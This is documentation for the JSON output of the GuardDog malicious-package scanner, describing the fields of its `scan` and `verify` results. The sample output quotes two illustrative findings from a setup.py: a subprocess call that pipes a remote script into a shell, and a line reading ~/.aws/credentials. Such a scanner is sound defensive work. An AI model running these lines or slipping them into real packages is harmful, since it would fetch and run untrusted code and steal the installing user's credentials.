# JSON output

`--output-format json` prints the raw scan results to standard output. It works with every ecosystem and with both `scan` and `verify`:

```sh
guarddog pypi scan requests --output-format json
guarddog npm verify package.json --output-format json
```

The format is described by a JSON Schema in [`json-output.schema.json`](json-output.schema.json). This page explains what each field means.

## `scan`

`scan` prints a single object. Abridged output of a local package scanned with `--metadata`:

```json
{
  "package": "./my-package",
  "issues": 23,
  "errors": {},
  "path": "/home/user/my-package",
  "results": {
    "capability-process-spawn": [
      {
        "location": "setup.py:10",
        "code": "        subprocess.Popen(\"curl http://203.0.113.5/x.sh | sh\", shell=True)",
        "match": "subprocess.Popen",
        "message": "Detects process execution and spawning"
      }
    ],
    "capability-runtime-clipboard": {},
    "typosquatting": null
  },
  "risk_score": {
    "score": 9.4,
    "label": "high_risk",
    "findings_count": 10,
    "score_breakdown": {"severity_component": 0.3, "chain_component": 0.2, "...": "..."}
  },
  "risks": [
    {
      "name": "risk.filesystem.read",
      "category": "filesystem",
      "severity": "high",
      "mitre_tactics": ["credential-access"],
      "threat_identifies": "threat.filesystem.read",
      "threat_rule": "threat-filesystem-read",
      "threat_description": "Detects access to sensitive files (credentials, configs, keys)",
      "threat_location": "setup.py:8",
      "threat_code": "        data = open(os.path.expanduser(\"~/.aws/credentials\")).read()",
      "threat_match": ".aws/credentials",
      "capability_identifies": "capability.filesystem.read",
      "capability_rule": "capability-filesystem-read",
      "file_path": "setup.py"
    }
  ]
}
```

| Field | Type | Meaning |
|---|---|---|
| `package` | string | The package name, directory or archive passed on the command line. |
| `issues` | integer | Raw hit count. See [How `issues`, `results` and `risks` relate](#how-issues-results-and-risks-relate). |
| `errors` | object | Rule name mapped to an error message, for each rule that failed to run. If the package cannot be downloaded, this holds a single `download-package` entry and every other field except `package` and `issues` is missing. |
| `results` | object | Every rule that ran, keyed by rule name (see below). |
| `path` | string | The directory that was analyzed. Present for remote packages and for local scans run with `--metadata`. |
| `risk_score` | object | Overall assessment of the package (see below). |
| `risks` | array | The individual risks behind the score (see below). |
| `package_version` | string | Remote packages only: the version that was scanned. |
| `pypi_dist_path` | string | PyPI only: the `/packages/...` path of the scanned distribution. |
| `pypi_inspector_url` | string | PyPI only, and only when `issues` is at least 1: a link to the package's files on PyPI Inspector. |

### `results`

The value of each entry depends on the kind of rule:

| Rule kind | No match | Match |
|---|---|---|
| Metadata rule (for example `typosquatting`) | `null` | A string explaining the match. |
| Source code rule (for example `capability-process-spawn`) | `{}` (an empty object) | A list of matches. |

Each source code match has:

| Field | Meaning |
|---|---|
| `location` | `<file path relative to the package root>:<line number>` |
| `code` | The matching line or lines, trimmed around the match. |
| `match` | The exact text that matched, or an empty string if it could not be decoded. |
| `message` | The rule's description. |

Matches with identical `code` are reported once. A source code rule that sets `max_hits` (see [WRITING_RULES.md](../WRITING_RULES.md)) stops collecting matches for the whole package once it reaches that limit, and files are visited in directory order, so its list is not necessarily every matching line.

### `risk_score`

| Field | Meaning |
|---|---|
| `score` | From 0 to 10. |
| `label` | One of `no_risks_detected`, `low`, `suspicious` or `high_risk`. |
| `findings_count` | Number of findings (source code matches plus matching metadata rules) that went into the score. |
| `score_breakdown` | How each factor contributed. Empty when there are no findings. `severity_component`, `chain_component`, `specificity_component` and `sophistication_component` are present otherwise, and `num_stages`, `has_source_code_risks`, `max_severity`, `dominant_specificity` and `dominant_sophistication` are added when at least one risk was formed. |
| `risks` | Only present, as an empty list, when there are no findings. Read the top-level `risks` instead. |

### `risks`

Each risk pairs a threat (what the code is trying to do) with the capability that makes it possible, when there is one.

| Field | Meaning |
|---|---|
| `name`, `category` | The risk, for example `risk.filesystem.read` in category `filesystem`. |
| `severity` | `low`, `medium` or `high`. |
| `mitre_tactics` | MITRE ATT&CK tactics, for example `credential-access`. |
| `threat_rule`, `threat_identifies`, `threat_description` | The rule that found the threat, what it identifies and its description. |
| `threat_location`, `threat_code`, `threat_match` | Where the threat was found, the surrounding code and the exact text that matched. Empty strings for metadata threats. |
| `capability_rule`, `capability_identifies` | The rule that found the matching capability and what it identifies. `null` when the threat stands on its own. |
| `file_path` | The file the threat was found in. Empty for metadata threats. |

## `verify`

`verify` prints a list with one entry per dependency it scanned:

```json
[
  {
    "dependency": "requests",
    "version": "2.32.3",
    "result": {
      "issues": 3,
      "errors": {},
      "results": {"...": "..."},
      "path": "/tmp/tmpk8rvdlbk/requests",
      "risk_score": {"score": 0.0, "label": "no_risks_detected", "findings_count": 3, "score_breakdown": {"...": "..."}},
      "risks": [],
      "package_version": "2.32.3",
      "pypi_dist_path": "/packages/f9/9b/.../requests-2.32.3-py3-none-any.whl",
      "pypi_inspector_url": "https://inspector.pypi.io/project/requests/2.32.3/"
    }
  }
]
```

`result` has the same fields as a `scan` result, except `package`, since the name is already in `dependency`.

## How `issues`, `results` and `risks` relate

They answer different questions and are not expected to add up:

- `results` lists what every rule found.
- `issues` is a raw hit count: one for each matching metadata rule, plus, for source code rules, the number of YARA string patterns that matched. A single entry in `results` can count as several issues.
- `risks` and `risk_score` are the risk engine's interpretation of those findings: a capability alone (for example reading files) does not form a risk, but a capability combined with a matching threat (for example reading `~/.aws/credentials`) does. A package can have findings and issues but no risks, and a `risk_score` of `no_risks_detected`.

For triage, start from `risk_score.label` and `risks`, and use `results` for the full detail.
